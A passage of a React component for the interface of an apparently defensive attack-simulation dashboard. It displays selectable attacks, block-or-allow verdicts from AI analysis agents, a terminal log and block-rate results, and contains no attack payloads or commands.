                                                                    onClick={() => toggleAttack(attack.id)}
                                                                    className={`w-full text-left p-2.5 rounded-lg border transition-all ${
                                                                        isSelected
                                                                            ? `${severityStyle.bg} ${severityStyle.border} ${severityStyle.text}`
                                                                            : 'bg-gray-800/50 border-gray-700/50 text-gray-300 hover:border-gray-600'
                                                                    }`}
                                                                >
                                                                    <div className="flex items-center justify-between">
                                                                        <span className="text-sm font-medium">{attack.name}</span>
                                                                        <span className={`text-[10px] px-1.5 py-0.5 rounded uppercase font-bold ${severityStyle.bg} ${severityStyle.text}`}>
                                                                            {getSeverityName(attack.severity)}
                                                                        </span>
                                                                    </div>
                                                                    <p className="text-[10px] text-gray-500 mt-1 truncate font-mono">{attack.description}</p>
                                                                </motion.button>
                                                            );
                                                        })}
                                                    </div>
                                                </motion.div>
                                            )}
                                        </AnimatePresence>
                                    </div>
                                );
                            })}
                        </div>
                    </div>
                </motion.div>

                <motion.div variants={itemVariants} className="lg:col-span-9 space-y-6">
                    <div className="bg-gray-900/80 backdrop-blur border border-gray-700/50 rounded-2xl overflow-hidden">
                        <div className="p-4 border-b border-gray-700/50 bg-gradient-to-r from-gray-800 to-transparent flex items-center justify-between">
                            <div className="flex items-center gap-2">
                                <Users className="w-5 h-5 text-blue-400" />
                                <h2 className="text-lg font-semibold text-white">{t('attackSimulator.liveAttackAnalysis')}</h2>
                            </div>
                            {attackProgress.length > 0 && (
                                <div className="flex items-center gap-2 text-sm text-gray-400">
                                    <span>{attackProgress.filter(p => p.status === 'complete').length}/{attackProgress.length}</span>
                                    <span>{t('attackSimulator.completed')}</span>
                                </div>
                            )}
                        </div>
                        <div className="p-4 max-h-[400px] overflow-y-auto">
                            {attackProgress.length > 0 ? (
                                <div className="space-y-3">
                                    {attackProgress.map((progress, index) => {
                                        const isBlocked = progress.result?.blocked;
                                        const statusColor = progress.status === 'complete' 
                                            ? (isBlocked ? 'green' : 'red')
                                            : progress.status === 'analyzing' ? 'yellow' : 'gray';
                                        
                                        return (
                                            <motion.div
                                                key={progress.attackId}
                                                initial={{ opacity: 0, y: 10 }}
                                                animate={{ opacity: 1, y: 0 }}
                                                transition={{ delay: index * 0.05 }}
                                                className={`relative p-4 rounded-xl border transition-all ${
                                                    statusColor === 'green' ? 'bg-green-500/5 border-green-500/30' :
                                                    statusColor === 'red' ? 'bg-red-500/5 border-red-500/30' :
                                                    statusColor === 'yellow' ? 'bg-yellow-500/5 border-yellow-500/30' :
                                                    'bg-gray-800/30 border-gray-700/50'
                                                }`}
                                            >
                                                <div className="flex items-start gap-4">
                                                    <div className={`relative flex-shrink-0 w-10 h-10 rounded-xl flex items-center justify-center ${
                                                        statusColor === 'green' ? 'bg-green-500/20' :
                                                        statusColor === 'red' ? 'bg-red-500/20' :
                                                        statusColor === 'yellow' ? 'bg-yellow-500/20' :
                                                        'bg-gray-500/20'
                                                    }`}>
                                                        {progress.status === 'analyzing' && (
                                                            <div className="absolute inset-0 rounded-xl animate-ping bg-yellow-500/20" />
                                                        )}
                                                        {progress.status === 'complete' ? (
                                                            isBlocked ? (
                                                                <CheckCircle className="w-5 h-5 text-green-400" />
                                                            ) : (
                                                                <XCircle className="w-5 h-5 text-red-400" />
                                                            )
                                                        ) : progress.status === 'analyzing' ? (
                                                            <RefreshCw className="w-5 h-5 text-yellow-400 animate-spin" />
                                                        ) : (
                                                            <Clock className="w-5 h-5 text-gray-400" />
                                                        )}
                                                    </div>
                                                    <div className="flex-1 min-w-0">
                                                        <div className="flex items-center justify-between">
                                                            <div>
                                                                <p className="text-white font-medium">{progress.attackName}</p>
                                                                <p className="text-xs text-gray-400">{getCategoryName(progress.category)}</p>
                                                            </div>
                                                            <div className="text-right">
                                                                {progress.status === 'complete' && progress.result && (
                                                                    <>
                                                                        <p className={`text-sm font-bold ${
                                                                            isBlocked ? 'text-green-400' : 'text-red-400'
                                                                        }`}>
                                                                            {isBlocked ? t('attackSimulator.blocked') : t('attackSimulator.allowed')}
                                                                        </p>
                                                                        <p className="text-xs text-gray-400">{progress.result.responseTime}ms</p>
                                                                    </>
                                                                )}
                                                                {progress.status === 'analyzing' && (
                                                                    <p className="text-sm text-yellow-400 animate-pulse">{t('attackSimulator.analyzing')}</p>
                                                                )}
                                                                {progress.status === 'pending' && (
                                                                    <p className="text-sm text-gray-400">{t('attackSimulator.pending')}</p>
                                                                )}
                                                            </div>
                                                        </div>
                                                        
                                                        {progress.analyses.length > 0 && (
                                                            <div className="mt-3 space-y-2">
                                                                {progress.analyses.map((analysis, ai) => {
                                                                    const agentStyle = getAgentStyle(analysis.agent);
                                                                    return (
                                                                        <motion.div
                                                                            key={ai}
                                                                            initial={{ opacity: 0, x: -10 }}
                                                                            animate={{ opacity: 1, x: 0 }}
                                                                            transition={{ delay: ai * 0.1 }}
                                                                            className={`flex items-start gap-2 p-2 rounded-lg ${agentStyle.bg} ${agentStyle.border} border`}
                                                                        >
                                                                            <div className={`flex-shrink-0 w-5 h-5 rounded-full flex items-center justify-center ${agentStyle.bg}`}>
                                                                                <Bot className={`w-3 h-3 ${agentStyle.color}`} />
                                                                            </div>
                                                                            <div className="flex-1 min-w-0">
                                                                                <div className="flex items-center gap-2">
                                                                                    <span className={`text-xs font-medium ${agentStyle.color}`}>
                                                                                        {agentStyle.name}
                                                                                    </span>
                                                                                </div>
                                                                                <p className="text-xs text-gray-300 mt-0.5">{analysis.message}</p>
                                                                                {analysis.verdict && (
                                                                                    <div className="mt-2 p-2 bg-black/20 rounded text-xs space-y-1">
                                                                                        <p>
                                                                                            <span className="text-white font-medium">{t('attackSimulator.decision')}: </span>
                                                                                            <span className={analysis.verdict === 'block' ? 'text-red-400' : 'text-green-400'}>
                                                                                                {analysis.verdict === 'block' ? t('attackSimulator.blocked') : t('attackSimulator.allowed')}
                                                                                            </span>
                                                                                            {analysis.confidence && (
                                                                                                <span className="text-gray-400"> ({(analysis.confidence * 100).toFixed(0)}%)</span>
                                                                                            )}
                                                                                        </p>
                                                                                    </div>
                                                                                )}
                                                                            </div>
                                                                        </motion.div>
                                                                    );
                                                                })}
                                                            </div>
                                                        )}
                                                    </div>
                                                </div>
                                            </motion.div>
                                        );
                                    })}
                                </div>
                            ) : (
                                <div className="text-center py-16">
                                    <div className="relative inline-block">
                                        <div className="absolute inset-0 bg-blue-500/20 blur-2xl rounded-full" />
                                        <Zap className="relative w-16 h-16 text-gray-600 mx-auto" />
                                    </div>
                                    <p className="text-gray-400 mt-4">{t('attackSimulator.selectAndRun')}</p>
                                </div>
                            )}
                        </div>
                    </div>

                    <div className="bg-gray-900/80 backdrop-blur border border-gray-700/50 rounded-2xl overflow-hidden">
                        <div className="p-4 border-b border-gray-700/50 bg-gradient-to-r from-gray-800 to-transparent flex items-center gap-2">
                            <Terminal className="w-5 h-5 text-gray-400" />
                            <h2 className="text-lg font-semibold text-white">{t('attackSimulator.terminal')}</h2>
                        </div>
                        <div className="relative">
                            <div className="absolute inset-0 pointer-events-none bg-[repeating-linear-gradient(0deg,transparent,transparent_2px,rgba(0,0,0,0.1)_2px,rgba(0,0,0,0.1)_4px)]" />
                            <div 
                                ref={terminalRef}
                                className="relative h-48 p-4 font-mono text-sm overflow-y-auto bg-black/40"
                            >
                                {terminalLogs.length > 0 ? (
                                    terminalLogs.map((log, i) => (
                                        <motion.div
                                            key={i}
                                            initial={{ opacity: 0 }}
                                            animate={{ opacity: 1 }}
                                            className="text-gray-300 leading-relaxed"
                                        >
                                            <span className="text-green-400">$</span> {log}
                                        </motion.div>
                                    ))
                                ) : (
                                    <div className="text-gray-500 flex items-center gap-2">
                                        <span className="text-green-400">$</span> {t('attackSimulator.waitingSimulation')}
                                        <span className="animate-pulse">_</span>
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                </motion.div>
            </div>

            <AnimatePresence>
                {report && (
                    <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -20 }}
                        className="grid grid-cols-1 lg:grid-cols-12 gap-6"
                    >
                        <div className="lg:col-span-4">
                            <div className="bg-gray-900/80 backdrop-blur border border-gray-700/50 rounded-2xl p-6">
                                <h2 className="text-lg font-semibold text-white mb-6 flex items-center gap-2">
                                    <BarChart3 className="w-5 h-5 text-blue-400" />
                                    {t('attackSimulator.results')}
                                </h2>
                                
                                <div className="grid grid-cols-3 gap-3 mb-6">
                                    <div className="text-center p-4 bg-white/5 rounded-xl border border-gray-700/50">
                                        <p className="text-3xl font-bold text-white">{report.total}</p>
                                        <p className="text-xs text-gray-400 mt-1">{t('attackSimulator.total')}</p>
                                    </div>
                                    <div className="text-center p-4 bg-green-500/10 rounded-xl border border-green-500/30">
                                        <p className="text-3xl font-bold text-green-400">{report.blocked}</p>
                                        <p className="text-xs text-green-400/70 mt-1">{t('attackSimulator.blocked')}</p>
                                    </div>
                                    <div className="text-center p-4 bg-red-500/10 rounded-xl border border-red-500/30">
                                        <p className="text-3xl font-bold text-red-400">{report.allowed}</p>
                                        <p className="text-xs text-red-400/70 mt-1">{t('attackSimulator.allowed')}</p>
                                    </div>
                                </div>

                                <div className="space-y-3">
                                    <div className="flex justify-between text-sm">
                                        <span className="text-gray-400">{t('attackSimulator.blockRate')}</span>
                                        <span className="text-white font-medium">{getBlockRate()}%</span>
                                    </div>
                                    <div className="h-2 bg-white/5 rounded-full overflow-hidden">
                                        <motion.div
                                            initial={{ width: 0 }}
                                            animate={{ width: `${getBlockRate()}%` }}
                                            transition={{ duration: 0.5 }}
                                            className="h-full bg-gradient-to-r from-green-500 to-emerald-400 rounded-full"
                                        />
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className="lg:col-span-8">
                            <div className="bg-gray-900/80 backdrop-blur border border-gray-700/50 rounded-2xl p-6">
                                <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                                    <AlertTriangle className="w-5 h-5 text-yellow-400" />
                                    {t('attackSimulator.attackResults')}
                                </h2>
                                <div className="space-y-2 max-h-64 overflow-y-auto">
                                    {report.results.map((result, i) => (
                                        <motion.div
                                            key={i}
                                            initial={{ opacity: 0, x: -20 }}
                                            animate={{ opacity: 1, x: 0 }}
                                            transition={{ delay: i * 0.05 }}
                                            className={`flex items-center justify-between p-3 rounded-xl border transition-all ${
                                                result.blocked 
                                                    ? 'bg-green-500/5 border-green-500/20 hover:bg-green-500/10' 
                                                    : 'bg-red-500/5 border-red-500/20 hover:bg-red-500/10'
                                            }`}
                                        >
                                            <div className="flex items-center gap-3">
                                                <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${
                                                    result.blocked ? 'bg-green-500/20' : 'bg-red-500/20'
                                                }`}>
                                                    {result.blocked ? (
                                                        <CheckCircle className="w-4 h-4 text-green-400" />
                                                    ) : (
                                                        <XCircle className="w-4 h-4 text-red-400" />
                                                    )}
                                                </div>
                                                <div>
                                                    <p className="text-white text-sm font-medium">{result.attackName}</p>
                                                    <p className="text-xs text-gray-400">{getCategoryName(result.category)}</p>
                                                </div>
                                            </div>
                                            <div className="text-right">
                                                <p className={`text-sm font-bold ${result.blocked ? 'text-green-400' : 'text-red-400'}`}>
                                                    {result.blocked ? t('attackSimulator.blocked') : t('attackSimulator.allowed')}
                                                </p>
                                                <p className="text-xs text-gray-400">{result.responseTime}ms</p>
                                            </div>
                                        </motion.div>
                                    ))}
                                </div>
                            </div>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            {history.length > 0 && (
                <motion.div variants={itemVariants} className="bg-gray-900/80 backdrop-blur border border-gray-700/50 rounded-2xl p-6">
                    <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                        <Clock className="w-5 h-5 text-purple-400" />
                        {t('attackSimulator.recentSimulations')}
                    </h2>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                        {history.slice(0, 6).map((item, i) => (
                            <motion.div
                                key={i}
                                initial={{ opacity: 0, scale: 0.95 }}
                                animate={{ opacity: 1, scale: 1 }}
                                transition={{ delay: i * 0.05 }}
                                className="p-4 bg-white/5 rounded-xl border border-gray-700/50 hover:border-gray-600 transition-all"
                            >
                                <p className="text-xs text-gray-400 mb-2">
                                    {new Date(item.startTime).toLocaleString()}
                                </p>
                                <div className="flex items-center gap-4 text-sm">
                                    <span className="text-white font-medium">{item.total} {t('attackSimulator.attacks')}</span>
                                    <span className="text-green-400">{item.blocked} {t('attackSimulator.blocked')}</span>
                                    <span className="text-red-400">{item.allowed} {t('attackSimulator.allowed')}</span>
                                </div>
                            </motion.div>
                        ))}
                    </div>
                </motion.div>
            )}
        </motion.div>
    );
}
